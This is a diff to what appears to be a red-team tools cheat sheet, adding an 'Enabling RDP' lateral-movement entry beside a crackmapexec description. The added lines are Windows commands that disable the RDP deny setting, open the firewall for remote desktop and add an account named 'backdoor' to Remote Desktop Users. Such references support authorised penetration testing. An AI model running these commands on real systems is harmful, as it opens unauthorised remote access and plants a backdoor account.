@@ -33,6 +33,7 @@
     - PingCastle
 10. [Lateral Movement](#lateral-movement)
     - crackmapexec
+    - Enabling RDP
 11. [Collection](#collection)
     - .
 12. [Command and Control](#command-and-control)
@@ -158,3 +159,9 @@ Lateral Movement
 	This is a great tool for pivoting in a Windows/Active Directory environment using credential pairs (username:password, username:hash). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.
 	
 	![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)
+
+* Enabling RDP
+
+	`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
+	`netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
+	`net localgroup "Remote Desktop Users" "backdoor" /add`
